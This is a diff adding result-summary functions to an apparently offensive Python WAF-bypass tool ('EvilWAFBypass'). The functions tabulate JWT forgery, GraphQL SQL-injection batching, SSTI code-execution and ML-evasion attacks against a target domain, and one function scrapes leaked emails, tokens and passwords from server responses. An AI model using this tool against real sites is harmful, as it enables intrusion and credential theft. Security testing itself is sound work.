+            print(f"\n{Colors.GREEN}{'SUCCESSFUL JWT PAYLOADS':<25} {'ALGORITHM':<15} {'TYPE':<20}{Colors.END}")
+            print(f"{Colors.GREEN}{'─'*25} {'─'*15} {'─'*20}{Colors.END}")
+            
+            for i, token_data in enumerate(working_tokens, 1):
+                token_type = token_data.get('type', 'Unknown')
+                token = token_data.get('token', '')
+                
+
+                try:
+                    decoded_header = jwt.get_unverified_header(token)
+                    algorithm = decoded_header.get('alg', 'Unknown')
+                except:
+                    algorithm = 'Unknown'
+                
+                
+                if 'none' in token_type:
+                    attack_type = 'NONE Algorithm'
+                elif 'injection' in token_type:
+                    attack_type = 'Header Injection'
+                elif 'exp' in token_type or 'iat' in token_type:
+                    attack_type = 'Claim Manipulation'
+                elif 'secret' in token_type:
+                    attack_type = 'Secret Confusion'
+                elif 'admin' in token_type or 'root' in token_type:
+                    attack_type = 'Privilege Escalation'
+                elif 'sql' in token_type or 'xss' in token_type:
+                    attack_type = 'Injection Attack'
+                else:
+                    attack_type = 'Algorithm Confusion'
+                
+                print(f"{Colors.WHITE}{i:>2}. {token_type:<22}{Colors.END} {Colors.CYAN}{algorithm:<15}{Colors.END} {Colors.YELLOW}{attack_type:<20}{Colors.END}")
+        
+        await asyncio.sleep(0.5)
+        
+
+        categories = {
+            'NONE Algorithm': ['none_algorithm'],
+            'HS256 Secrets': ['simple_secret', 'domain_secret', 'empty_secret', 'null_secret', 
+                             'key_secret', 'password_secret', 'admin_secret', 'jwt_secret',
+                             'token_secret', 'secret_secret'],
+            'Algorithm Mix': ['RS256_with_HS256', 'public_key_as_secret', 'url_as_secret'],
+            'Header Injection': ['kid_injection', 'jku_injection', 'x5u_injection'],
+            'Claim Manipulation': ['future_exp', 'past_iat', 'no_exp'],
+            'Privilege Escalation': ['super_admin', 'root_user', 'bypass_claims', 
+                                   'uppercase_admin', 'mixed_case'],
+            'Injection Attacks': ['sql_injection_claim', 'xss_claim']
+        }
+        
+        category_counts = {}
+        for category, payloads in categories.items():
+            count = sum(1 for token in working_tokens if token.get('type') in payloads)
+            if count > 0:
+                category_counts[category] = count
+        
+        if category_counts:
+            print(f"\n{Colors.CYAN}{'ATTACK CATEGORIES':<25} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
+            print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*12}{Colors.END}")
+            
+            for category, count in category_counts.items():
+                percent = (count / success_payloads) * 100 if success_payloads > 0 else 0
+                print(f"{Colors.WHITE}{category:<25}{Colors.END} {Colors.GREEN}{count:<8}{Colors.END} {Colors.CYAN}{percent:6.1f}[%]{'':<6}{Colors.END}")
+        
+        
+        print()
+        print_bg_header("", '\033[44m')
+        print_bg_header(f" JWT ATTACK COMPLETED: {success_rate:.1f}% SUCCESS RATE ", '\033[44m')
+        print_bg_header(f" {success_payloads}/{total_payloads} payloads successful ", '\033[44m')
+        print_bg_header("", '\033[44m')    
+    
+
+
+
+
 
     async def graphql_batching_bypass(self, domain):
         """GraphQL Query Batching Bypass"""
@@ -1554,7 +2231,220 @@ class EvilWAFBypass:
             
             await asyncio.sleep(0.5)
         
+        await self.print_graphql_summary_report(domain, working_queries)  
         return working_queries
+
+
+
+
+
+    
+    async def print_graphql_summary_report(self, domain, working_queries):
+        """Print comprehensive GraphQL Batching Bypass summary"""
+        
+        def print_bg_header(text, bg_color):
+            import shutil
+            try:
+                width = shutil.get_terminal_size().columns
+            except:
+                width = 80
+            padding = (width - len(text)) // 2
+            spaces = " " * padding + text + " " * (width - len(text) - padding)
+            print(f"{bg_color}{Colors.BLACK}{spaces}{Colors.END}")
+        
+        
+        print_bg_header("", '\033[44m')
+        print_bg_header(" GRAPHQL BATCHING BYPASS ATTACK SUMMARY ", '\033[44m')
+        print_bg_header("", '\033[44m')
+        
+        print(f"\n{Colors.CYAN}[+] Generating GraphQL Batching summary...{Colors.END}")
+        await asyncio.sleep(1)
+        
+        
+        total_payloads = 5
+        success_payloads = len(working_queries)
+        success_rate = (success_payloads / total_payloads) * 100 if total_payloads > 0 else 0
+        
+        
+        print(f"\n{Colors.CYAN}{'GRAPHQL ATTACK STATISTICS':<25} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
+        print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*12}{Colors.END}")
+        
+        print(f"{Colors.WHITE}{'Total Payloads Tested':<25}{Colors.END} {Colors.YELLOW}{total_payloads:<8}{Colors.END} {Colors.CYAN}100.0%{'':<6}{Colors.END}")
+        print(f"{Colors.WHITE}{'Successful Queries':<25}{Colors.END} {Colors.GREEN}{success_payloads:<8}{Colors.END} {Colors.CYAN}{success_rate:6.1f}%{'':<6}{Colors.END}")
+        print(f"{Colors.WHITE}{'Failed Queries':<25}{Colors.END} {Colors.RED}{total_payloads-success_payloads:<8}{Colors.END} {Colors.CYAN}{(100-success_rate):6.1f}%{'':<6}{Colors.END}")
+        
+        await asyncio.sleep(0.5)
+        
+        
+        if working_queries:
+            print(f"\n{Colors.GREEN}{'SUCCESSFUL GRAPHQL QUERIES':<25} {'TYPE':<20} {'ENDPOINT':<15}{Colors.END}")
+            print(f"{Colors.GREEN}{'─'*25} {'─'*20} {'─'*15}{Colors.END}")
+            
+            for i, query_data in enumerate(working_queries, 1):
+                payload = query_data.get('payload', {})
+                endpoint = query_data.get('endpoint', 'Unknown')
+                
+                
+                if isinstance(payload, list):
+                    if any("UNION SELECT" in str(q.get('query', '')) for q in payload):
+                        attack_type = "SQL INJECTION BATCHING"
+                    elif any("mutation" in str(q.get('query', '')).lower() for q in payload):
+                        attack_type = "MUTATION BATCHING"
+                    else:
+                        attack_type = "QUERY BATCHING"
+                else:
+                    query_str = str(payload.get('query', ''))
+                    if "__schema" in query_str:
+                        attack_type = "INTROSPECTION ATTACK"
+                    elif "UNION SELECT" in query_str:
+                        attack_type = "SQL INJECTION"
+                    elif "aliasing" in query_str.lower() or "normal:" in query_str:
+                        attack_type = "ALIASING ATTACK"
+                    elif "variables" in payload:
+                        attack_type = "VARIABLES BATCHING"
+                    else:
+                        attack_type = "STANDARD QUERY"
+                
+                print(f"{Colors.WHITE}{i:>2}. Query {i:<18}{Colors.END} {Colors.CYAN}{attack_type:<20}{Colors.END} {Colors.YELLOW}{endpoint:<15}{Colors.END}")
+        
+        await asyncio.sleep(0.5)
+        
+        
+        if working_queries:
+            endpoints_found = list(set([q.get('endpoint', 'Unknown') for q in working_queries]))
+            
+            print(f"\n{Colors.GREEN}{'VULNERABLE GRAPHQL ENDPOINTS':<25} {'SUCCESS COUNT':<15}{Colors.END}")
+            print(f"{Colors.GREEN}{'─'*25} {'─'*15}{Colors.END}")
+            
+            for endpoint in endpoints_found:
+                count = sum(1 for q in working_queries if q.get('endpoint') == endpoint)
+                print(f"{Colors.WHITE}{endpoint:<25}{Colors.END} {Colors.GREEN}{count:<15}{Colors.END}")
+        
+        await asyncio.sleep(0.5)
+        
+        
+        categories = {
+            'Query Batching': ['QUERY BATCHING'],
+            'Mutation Batching': ['MUTATION BATCHING'],
+            'SQL Injection': ['SQL INJECTION', 'SQL INJECTION BATCHING'],
+            'Introspection': ['INTROSPECTION ATTACK'],
+            'Aliasing Attack': ['ALIASING ATTACK'],
+            'Variables Batching': ['VARIABLES BATCHING']
+        }
+        
+        
+        category_counts = {}
+        for query_data in working_queries:
+            payload = query_data.get('payload', {})
+            
+            if isinstance(payload, list):
+                if any("UNION SELECT" in str(q.get('query', '')) for q in payload):
+                    category = 'SQL Injection'
+                elif any("mutation" in str(q.get('query', '')).lower() for q in payload):
+                    category = 'Mutation Batching'
+                else:
+                    category = 'Query Batching'
+            else:
+                query_str = str(payload.get('query', ''))
+                if "__schema" in query_str:
+                    category = 'Introspection'
+                elif "UNION SELECT" in query_str:
+                    category = 'SQL Injection'
+                elif "aliasing" in query_str.lower() or "normal:" in query_str:
+                    category = 'Aliasing Attack'
+                elif "variables" in payload:
+                    category = 'Variables Batching'
+                else:
+                    category = 'Query Batching'
+            
+            category_counts[category] = category_counts.get(category, 0) + 1
+        
+        if category_counts:
+            print(f"\n{Colors.CYAN}{'ATTACK CATEGORIES':<25} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
+            print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*12}{Colors.END}")
+            
+            for category, count in category_counts.items():
+                percent = (count / success_payloads) * 100 if success_payloads > 0 else 0
+                print(f"{Colors.WHITE}{category:<25}{Colors.END} {Colors.GREEN}{count:<8}{Colors.END} {Colors.CYAN}{percent:6.1f}%{'':<6}{Colors.END}")
+        
+
+        await asyncio.sleep(0.5)
+        
+        if working_queries:
+            print(f"\n{Colors.RED}{'ACTUAL DATA LEAKED':<30} {'VALUE':<40}{Colors.END}")
+            print(f"{Colors.RED}{'─'*30} {'─'*40}{Colors.END}")
+            
+            data_found = False
+            
+            for i, query_data in enumerate(working_queries, 1):
+                response = query_data.get('response_preview', '')
+                
+                
+                email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
+                emails = re.findall(email_pattern, response)
+                
+                
+                token_pattern = r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]*'
+                tokens = re.findall(token_pattern, response)
+                
+                
+                password_pattern = r'"password"\s*:\s*"([^"]+)"|\'password\'\s*:\s*\'([^\']+)\''
+                passwords = re.findall(password_pattern, response)
+                
+                passwords = [p for tuple_item in passwords for p in tuple_item if p]
+                
+                
+                admin_pattern = r'"admin"\s*:\s*(true|false)|"role"\s*:\s*"([^"]+)"|"isAdmin"\s*:\s*(true|false)'
+                admin_data = re.findall(admin_pattern, response)
+                admin_data = [item for tuple_item in admin_data for item in tuple_item if item]
+                
+                
+                if emails:
+                    for email in emails[:2]:  
+                        print(f"{Colors.WHITE}{i:>2}. Email{'':<25}{Colors.END} {Colors.RED}{email:<40}{Colors.END}")
+                        data_found = True
+                
+                if tokens:
+                    for token in tokens[:2]:  
+                        token_preview = token[:35] + "..." if len(token) > 35 else token
+                        print(f"{Colors.WHITE}{i:>2}. JWT Token{'':<20}{Colors.END} {Colors.RED}{token_preview:<40}{Colors.END}")
+                        data_found = True
+                
+                if passwords:
+                    for password in passwords[:2]:  # Show first 2 passwords
+                        password_preview = password[:35] + "..." if len(password) > 35 else password
+                        print(f"{Colors.WHITE}{i:>2}. Password{'':<21}{Colors.END} {Colors.RED}{password_preview:<40}{Colors.END}")
+                        data_found = True
+                
+                if admin_data:
+                    for admin_item in admin_data[:2]:  #
+                        print(f"{Colors.WHITE}{i:>2}. Admin Data{'':<19}{Colors.END} {Colors.RED}{admin_item:<40}{Colors.END}")
+                        data_found = True
+                
+                
+                user_pattern = r'"id"\s*:\s*"([^"]+)"|"username"\s*:\s*"([^"]+)"|"name"\s*:\s*"([^"]+)"'
+                users = re.findall(user_pattern, response)
+                users = [item for tuple_item in users for item in tuple_item if item]
+                
+                if users:
+                    for user in users[:2]:  # Show first 2 users
+                        print(f"{Colors.WHITE}{i:>2}. User Data{'':<20}{Colors.END} {Colors.RED}{user:<40}{Colors.END}")
+                        data_found = True
+            
+            if not data_found:
+                print(f"{Colors.YELLOW}No sensitive data extracted from responses{Colors.END}")
+        
+        
+        print()
+        print_bg_header("", '\033[44m')
+        print_bg_header(f" GRAPHQL ATTACK COMPLETED: {success_rate:.1f}% SUCCESS RATE ", '\033[44m')
+        print_bg_header(f" {success_payloads}/{total_payloads} queries successful ", '\033[44m')
+        print_bg_header("", '\033[44m')
+
+
+
+
+
 
     async def grpc_protobuf_bypass(self, domain):
         """gRPC/Protobuf Bypass """
@@ -1740,7 +2630,7 @@ class EvilWAFBypass:
                             if any(success_indicators):
                                 results.append(f"SSTI {attack_name}")
                                 successful_attacks += 1
-                                print(f"[-] {attack_name} (GET {j+1}): Success")
+                                print(f"[-] {attack_name} (GET {j+1}):{Colors.YELLOW} Success{Colors.END}")
                                 success = True
                                 break
                                 
@@ -1750,7 +2640,7 @@ class EvilWAFBypass:
                         continue
                 
                 if not success:
-                    print(f"[-] {attack_name}: Failed")
+                    print(f"[-] {attack_name}:{Colors.RED}Failed{Colors.END}")
                     
             except Exception as e:
                 print(f"[-] {attack_name}: Error - {str(e)}")
@@ -1758,6 +2648,8 @@ class EvilWAFBypass:
             await asyncio.sleep(0.3)
         
         print(f"[+] SSTI Attacks: {successful_attacks}/{len(ssti_payloads)} Successful")
+        
+        await self.print_ssti_summary_report(domain, results, ssti_payloads)
         return results
 
     def get_ssti_attack_name(self, index):
@@ -1809,6 +2701,255 @@ class EvilWAFBypass:
         import random
         return random.choice(user_agents)
 
+
+
+
+
+
+    
+    async def print_ssti_summary_report(self, domain, results, ssti_payloads):
+        """Print comprehensive SSTI Polyglot Attacks summary"""
+        
+        def print_bg_header(text, bg_color):
+            import shutil
+            try:
+                width = shutil.get_terminal_size().columns
+            except:
+                width = 80
+            padding = (width - len(text)) // 2
+            spaces = " " * padding + text + " " * (width - len(text) - padding)
+            print(f"{bg_color}{Colors.BLACK}{spaces}{Colors.END}")
+        
+        
+        print_bg_header("", '\033[44m')
+        print_bg_header(" SSTI POLYGLOT ATTACKS SUMMARY ", '\033[44m')
+        print_bg_header("", '\033[44m')
+        
+        print(f"\n{Colors.CYAN}[+] Generating SSTI Polyglot Attacks summary...{Colors.END}")
+        await asyncio.sleep(1)
+        
+        
+        total_payloads = len(ssti_payloads)
+        success_payloads = len(results)
+        success_rate = (success_payloads / total_payloads) * 100 if total_payloads > 0 else 0
+        
+        
+        print(f"\n{Colors.CYAN}{'SSTI ATTACK STATISTICS':<25} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
+        print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*12}{Colors.END}")
+        
+        print(f"{Colors.WHITE}{'Total Payloads Tested':<25}{Colors.END} {Colors.YELLOW}{total_payloads:<8}{Colors.END} {Colors.CYAN}100.0%{'':<6}{Colors.END}")
+        print(f"{Colors.WHITE}{'Successful Attacks':<25}{Colors.END} {Colors.GREEN}{success_payloads:<8}{Colors.END} {Colors.CYAN}{success_rate:6.1f}[%]{'':<6}{Colors.END}")
+        print(f"{Colors.WHITE}{'Failed Attacks':<25}{Colors.END} {Colors.RED}{total_payloads-success_payloads:<8}{Colors.END} {Colors.CYAN}{(100-success_rate):6.1f}[%]{'':<6}{Colors.END}")
+        
+        await asyncio.sleep(0.5)
+        
+        # 
+        if results:
+            print(f"\n{Colors.GREEN}{'SUCCESSFUL SSTI ATTACKS':<30} {'ENGINE':<20} {'TECHNIQUE':<25}{Colors.END}")
+            print(f"{Colors.GREEN}{'─'*30} {'─'*20} {'─'*25}{Colors.END}")
+            
+            for i, attack_name in enumerate(results, 1):
+                # 
+                if "Universal" in attack_name:
+                    engine = "MULTI-ENGINE"
+                    technique = "POLYGLOT PAYLOAD"
+                elif "Python" in attack_name:
+                    engine = "JINJA2/TORNADO"
+                    technique = "CLASS INSPECTION"
+                elif "Java" in attack_name:
+                    engine = "SPRING/THYMELEAF"
+                    technique = "EXPRESSION LANGUAGE"
+                elif "Cache" in attack_name:
+                    engine = "TWIG/SMARTY"
+                    technique = "DEBUG EXPLOIT"
+                elif "Multi-Engine" in attack_name:
+                    engine = "JINJA2/SPRING"
+                    technique = "COMMAND EXECUTION"
+                elif "File Read" in attack_name:
+                    engine = "JINJA2/SPRING"
+                    technique = "FILE SYSTEM ACCESS"
+                elif "Command Chain" in attack_name:
+                    engine = "JINJA2/FLASK"
+                    technique = "GLOBALS EXPLOIT"
+                elif "Jinja2" in attack_name:
+                    engine = "JINJA2"
+                    technique = "OS COMMAND EXEC"
+                elif "Twig" in attack_name:
+                    engine = "TWIG"
+                    technique = "CALLBACK EXPLOIT"
+                elif "Freemarker" in attack_name:
+                    engine = "FREEMARKER"
+                    technique = "TEMPLATE EXEC"
+                else:
+                    engine = "UNKNOWN"
+                    technique = "STANDARD SSTI"
+                
+                print(f"{Colors.WHITE}{i:>2}. {attack_name:<27}{Colors.END} {Colors.CYAN}{engine:<20}{Colors.END} {Colors.YELLOW}{technique:<25}{Colors.END}")
+        
+        await asyncio.sleep(0.5)
+        
+
+        if results:
+            print(f"\n{Colors.CYAN}{'TEMPLATE ENGINE VULNERABILITIES':<25} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
+            print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*12}{Colors.END}")
+            
+            engine_counts = {
+                'JINJA2/TORNADO': 0,
+                'SPRING/THYMELEAF': 0,
+                'TWIG/SMARTY': 0,
+                'FREEMARKER': 0,
+                'MULTI-ENGINE': 0,
+                'UNKNOWN': 0
+            }
+            
+            for attack_name in results:
+                if "Python" in attack_name or "Jinja2" in attack_name or "Command Chain" in attack_name:
+                    engine_counts['JINJA2/TORNADO'] += 1
+                elif "Java" in attack_name or "Multi-Engine" in attack_name or "File Read" in attack_name:
+                    engine_counts['SPRING/THYMELEAF'] += 1
+                elif "Cache" in attack_name or "Twig" in attack_name:
+                    engine_counts['TWIG/SMARTY'] += 1
+                elif "Freemarker" in attack_name:
+                    engine_counts['FREEMARKER'] += 1
+                elif "Universal" in attack_name:
+                    engine_counts['MULTI-ENGINE'] += 1
+                else:
+                    engine_counts['UNKNOWN'] += 1
+            
+            for engine, count in engine_counts.items():
+                if count > 0:
+                    percent = (count / success_payloads) * 100 if success_payloads > 0 else 0
+                    print(f"{Colors.WHITE}{engine:<25}{Colors.END} {Colors.GREEN}{count:<8}{Colors.END} {Colors.CYAN}{percent:6.1f}[%]{'':<6}{Colors.END}")
+        
+
+        await asyncio.sleep(0.5)
+        
+        if results:
+            print(f"\n{Colors.GREEN}{'SUCCESSFUL SSTI PAYLOADS':<80}{Colors.END}")
+            print(f"{Colors.GREEN}{'─'*80}{Colors.END}")
+            
+            successful_indices = [i for i, attack_name in enumerate(results) if attack_name.startswith("SSTI")]
+            
+            for i, attack_name in enumerate(results, 1):
+                
+                payload_index = i - 1
+                if payload_index < len(ssti_payloads):
+                    payload = ssti_payloads[payload_index]
+                    
+
+                    if "{{" in payload and "${" in payload and "#{" in payload:
+                        payload_type = "UNIVERSAL POLYGLOT"
+                    elif "{{" in payload and "__class__" in payload:
+                        payload_type = "PYTHON RCE"
+                    elif "${" in payload and "T(java.lang" in payload:
+                        payload_type = "JAVA EL INJECTION"
+                    elif "{% debug %}" in payload:
+                        payload_type = "DEBUG EXPLOIT"
+                    elif "popen" in payload and "read()" in payload:
+                        payload_type = "COMMAND EXECUTION"
+                    elif "/etc/passwd" in payload:
+                        payload_type = "FILE READ ATTACK"
+                    elif "__globals__" in payload:
+                        payload_type = "GLOBALS EXPLOIT"
+                    elif "registerUndefinedFilterCallback" in payload:
+                        payload_type = "CALLBACK EXPLOIT"
+                    elif "<#assign" in payload:
+                        payload_type = "FREEMARKER RCE"
+                    else:
+                        payload_type = "CUSTOM PAYLOAD"
+                    
+                    
+                    payload_preview = payload[:60] + "..." if len(payload) > 60 else payload
+                    
+                    print(f"{Colors.WHITE}{i:>2}. {attack_name:<25}{Colors.END}")
+                    print(f"{Colors.CYAN}    Type: {payload_type:<30}{Colors.END}")
+                    print(f"{Colors.YELLOW}    Payload: {payload_preview:<55}{Colors.END}")
+                    print()
+        
+        
+        await asyncio.sleep(0.5)
+        
+        if results:
+            print(f"\n{Colors.CYAN}{'ATTACK TECHNIQUES EFFECTIVENESS':<35} {'SUCCESS':<8} {'IMPACT':<15}{Colors.END}")
+            print(f"{Colors.CYAN}{'─'*35} {'─'*8} {'─'*15}{Colors.END}")
+            
+            technique_stats = {
+                'CODE EXECUTION': 0,
+                'FILE SYSTEM ACCESS': 0,
+                'CLASS INSPECTION': 0,
+                'COMMAND INJECTION': 0,
+                'DEBUG EXPLOIT': 0,
+                'POLYGLOT BYPASS': 0
+            }
+            
+            for attack_name in results:
+                if "RCE" in attack_name or "exec" in attack_name.lower():
+                    technique_stats['CODE EXECUTION'] += 1
+                elif "File Read" in attack_name or "/etc/passwd" in attack_name:
+                    technique_stats['FILE SYSTEM ACCESS'] += 1
+                elif "Python" in attack_name or "__class__" in attack_name:
+                    technique_stats['CLASS INSPECTION'] += 1
+                elif "Command" in attack_name or "popen" in attack_name:
+                    technique_stats['COMMAND INJECTION'] += 1
+                elif "Cache" in attack_name or "debug" in attack_name:
+                    technique_stats['DEBUG EXPLOIT'] += 1
+                elif "Universal" in attack_name or "Polyglot" in attack_name:
+                    technique_stats['POLYGLOT BYPASS'] += 1
+            
+            for technique, count in technique_stats.items():
+                if count > 0:
+                    impact_level = "CRITICAL" if technique in ['CODE EXECUTION', 'COMMAND INJECTION'] else "HIGH" if technique in ['FILE SYSTEM ACCESS'] else "MEDIUM"
+                    impact_color = Colors.RED if impact_level == "CRITICAL" else Colors.YELLOW if impact_level == "HIGH" else Colors.GREEN
+                    
+                    print(f"{Colors.WHITE}{technique:<35}{Colors.END} {Colors.GREEN}{count:<8}{Colors.END} {impact_color}{impact_level:<15}{Colors.END}")
+        
+        
+        await asyncio.sleep(0.5)
+        
+        if results:
+            print(f"\n{Colors.RED}{'SECURITY IMPACT ASSESSMENT':<40} {'LEVEL':<15} {'DESCRIPTION':<25}{Colors.END}")
+            print(f"{Colors.RED}{'─'*40} {'─'*15} {'─'*25}{Colors.END}")
+            
+            impacts = []
+            
+            if any("RCE" in attack for attack in results):
+                impacts.append(("REMOTE CODE EXECUTION", "CRITICAL", "Full server compromise"))
+            
+            if any("File Read" in attack for attack in results):
+                impacts.append(("FILE SYSTEM ACCESS", "CRITICAL", "Sensitive file reading"))
+            
+            if any("Command" in attack for attack in results):
+                impacts.append(("COMMAND INJECTION", "CRITICAL", "OS command execution"))
+            
+            if any("Java" in attack for attack in results):
+                impacts.append(("JAVA RCE", "HIGH", "JVM-level compromise"))
+            
+            if any("Python" in attack for attack in results):
+                impacts.append(("PYTHON RCE", "HIGH", "Python interpreter access"))
+            
+            if any("Universal" in attack for attack in results):
+                impacts.append(("POLYGLOT BYPASS", "MEDIUM", "Multi-engine vulnerability"))
+            
+            for impact, level, description in impacts:
+                level_color = Colors.RED if level == "[CRITICAL]" else Colors.YELLOW if level == "[HIGH]" else Colors.GREEN
+                print(f"{Colors.WHITE}{impact:<40}{Colors.END} {level_color}{level:<15}{Colors.END} {Colors.CYAN}{description:<25}{Colors.END}")
+        
+      
+        print()
+        print_bg_header("", '\033[44m')
+        print_bg_header(f" SSTI SCAN COMPLETED: {success_rate:.1f}% SUCCESS RATE ", '\033[44m')
+        print_bg_header(f" {success_payloads}/{total_payloads} attacks successful ", '\033[44m')
+        print_bg_header("", '\033[44m')
+
+
+
+
+
+
+
+
+
+
     async def ml_waf_evasion(self, domain):
         """Machine Learning WAF Evasion"""
         print(f"\033[41m PHASE 9: ML WAF Evasion Attacks\033[0m")
@@ -1853,18 +2994,18 @@ class EvilWAFBypass:
                             if response.status == 200 and len(content) > 500:
                                 results.append(f"ML Evasion {attack_name}")
                                 successful_attacks += 1
-                                print(f"[-] {attack_name} (GET {endpoint}): Success")
+                                print(f"[-] {attack_name} (GET {endpoint}):{Colors.YELLOW}Success{Colors.END}")
                                 success = True
                                 break
                                 
                     except asyncio.TimeoutError:
-                        print(f"[-] {attack_name} (GET {endpoint}): Timeout")
+                        print(f"[-] {attack_name} (GET {endpoint}):{Colors.RED}Timeout{Colors.END}")
                         continue
                     except Exception as e:
                         continue
                 
                 if not success:
-                    print(f"[-] {attack_name}: FAILED")
+                    print(f"[-] {attack_name}:{Colors.RED}Failed{Colors.END}")
                     
             except Exception as e:
                 print(f"[-] {attack_name}: Error - {e}")
@@ -1872,6 +3013,8 @@ class EvilWAFBypass:
             await asyncio.sleep(0.3)
         
         print(f"[+] ML WAF Evasion: {successful_attacks}/{len(ml_evasion_payloads)} Successful")
+        
+        await self.print_ml_evasion_summary_report(domain, results, ml_evasion_payloads)
         return results
 
     def get_ml_evasion_name(self, index):
@@ -1899,6 +3042,310 @@ class EvilWAFBypass:
         """Async context manager exit"""
         await self.close_session()    
     
+
+
+
+
+
+    
+    async def print_ml_evasion_summary_report(self, domain, results, ml_evasion_payloads):
+        """Print comprehensive ML WAF Evasion Attacks summary"""
+        
+        def print_bg_header(text, bg_color):
+            import shutil
+            try:
+                width = shutil.get_terminal_size().columns
+            except:
+                width = 80
+            padding = (width - len(text)) // 2
+            spaces = " " * padding + text + " " * (width - len(text) - padding)
+            print(f"{bg_color}{Colors.BLACK}{spaces}{Colors.END}")
+        
+        # BLUE BACKGROUND - MWANZO
+        print_bg_header("", '\033[44m')
+        print_bg_header(" ML WAF EVASION ATTACKS SUMMARY ", '\033[44m')
+        print_bg_header("", '\033[44m')
+        
+        print(f"\n{Colors.CYAN}[+] Generating ML WAF Evasion summary...{Colors.END}")
+        await asyncio.sleep(1)
+        
+
+        total_payloads = len(ml_evasion_payloads)
+        success_payloads = len(results)
+        success_rate = (success_payloads / total_payloads) * 100 if total_payloads > 0 else 0
+        
+
+        print(f"\n{Colors.CYAN}{'ML EVASION STATISTICS':<25} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
+        print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*12}{Colors.END}")
+        
+        print(f"{Colors.WHITE}{'Total Payloads Tested':<25}{Colors.END} {Colors.YELLOW}{total_payloads:<8}{Colors.END} {Colors.CYAN}100.0%{'':<6}{Colors.END}")
+        print(f"{Colors.WHITE}{'Successful Evasions':<25}{Colors.END} {Colors.GREEN}{success_payloads:<8}{Colors.END} {Colors.CYAN}{success_rate:6.1f}[%]{'':<6}{Colors.END}")
+        print(f"{Colors.WHITE}{'Failed Evasions':<25}{Colors.END} {Colors.RED}{total_payloads-success_payloads:<8}{Colors.END} {Colors.CYAN}{(100-success_rate):6.1f}[%]{'':<6}{Colors.END}")
+        
+        await asyncio.sleep(0.5)
+        
+
+        if results:
+            print(f"\n{Colors.GREEN}{'SUCCESSFUL ML EVASIONS':<30} {'TECHNIQUE':<25} {'CATEGORY':<20}{Colors.END}")
+            print(f"{Colors.GREEN}{'─'*30} {'─'*25} {'─'*20}{Colors.END}")
+            
+            for i, attack_name in enumerate(results, 1):
+
+                technique_name = attack_name.replace("ML Evasion ", "")
+                
+                # 
+                if "Comment" in technique_name:
+                    category = "COMMENT OBFUSCATION"
+                    technique_type = "SQL COMMENT BYPASS"
+                elif "Full-Width" in technique_name:
+                    category = "UNICODE EVASION"
+                    technique_type = "FULL-WIDTH CHARS"
+                elif "Token" in technique_name:
+                    category = "TOKEN SPLITTING"
+                    technique_type = "COMMAND SPLITTING"
+                elif "Unicode Escape" in technique_name:
+                    category = "UNICODE EVASION"
+                    technique_type = "CHARACTER ESCAPE"
+                elif "Homoglyph" in technique_name:
+                    category = "HOMOGLYPH ATTACK"
+                    technique_type = "VISUAL SPOOFING"
+                elif "Zero-Width" in technique_name:
+                    category = "INVISIBLE CHARS"
+                    technique_type = "ZERO-WIDTH INJECTION"
+                elif "Case Rotation" in technique_name:
+                    category = "CASE MANIPULATION"
+                    technique_type = "CASE ROTATION"
+                elif "HTML Entity" in technique_name:
+                    category = "ENCODING EVASION"
+                    technique_type = "HTML ENTITY ENCODE"
+                elif "MySQL Comment" in technique_name:
+                    category = "COMMENT OBFUSCATION"
+                    technique_type = "MYSQL COMMENT"
+                elif "Time-Based" in technique_name:
+                    category = "TIME-BASED SQLi"
+                    technique_type = "BLIND SQL INJECTION"
+                else:
+                    category = "ADVANCED EVASION"
+                    technique_type = "CUSTOM TECHNIQUE"
+                
+                print(f"{Colors.WHITE}{i:>2}. {technique_name:<27}{Colors.END} {Colors.CYAN}{technique_type:<25}{Colors.END} {Colors.YELLOW}{category:<20}{Colors.END}")
+        
+        await asyncio.sleep(0.5)
+        
+
+        if results:
+            print(f"\n{Colors.CYAN}{'EVASION CATEGORIES':<25} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
+            print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*12}{Colors.END}")
+            
+            category_counts = {
+                'COMMENT OBFUSCATION': 0,
+                'UNICODE EVASION': 0,
+                'TOKEN SPLITTING': 0,
+                'HOMOGLYPH ATTACK': 0,
+                'INVISIBLE CHARS': 0,
+                'CASE MANIPULATION': 0,
+                'ENCODING EVASION': 0,
+                'TIME-BASED SQLi': 0,
+                'ADVANCED EVASION': 0
+            }
+            
+            for attack_name in results:
+                if "Comment" in attack_name:
+                    category_counts['COMMENT OBFUSCATION'] += 1
+                elif "Full-Width" in attack_name or "Unicode Escape" in attack_name:
+                    category_counts['UNICODE EVASION'] += 1
+                elif "Token" in attack_name:
+                    category_counts['TOKEN SPLITTING'] += 1
+                elif "Homoglyph" in attack_name:
+                    category_counts['HOMOGLYPH ATTACK'] += 1
+                elif "Zero-Width" in attack_name:
+                    category_counts['INVISIBLE CHARS'] += 1
+                elif "Case Rotation" in attack_name:
+                    category_counts['CASE MANIPULATION'] += 1
+                elif "HTML Entity" in attack_name:
+                    category_counts['ENCODING EVASION'] += 1
+                elif "Time-Based" in attack_name:
+                    category_counts['TIME-BASED SQLi'] += 1
+                else:
+                    category_counts['ADVANCED EVASION'] += 1
+            
+            for category, count in category_counts.items():
+                if count > 0:
+                    percent = (count / success_payloads) * 100 if success_payloads > 0 else 0
+                    print(f"{Colors.WHITE}{category:<25}{Colors.END} {Colors.GREEN}{count:<8}{Colors.END} {Colors.CYAN}{percent:6.1f}[%]{'':<6}{Colors.END}")
+        
+        
+        await asyncio.sleep(0.5)
+        
+        if results:
+            print(f"\n{Colors.GREEN}{'SUCCESSFUL EVASION PAYLOADS':<80}{Colors.END}")
+            print(f"{Colors.GREEN}{'─'*80}{Colors.END}")
+            
+            for i, attack_name in enumerate(results, 1):
+                
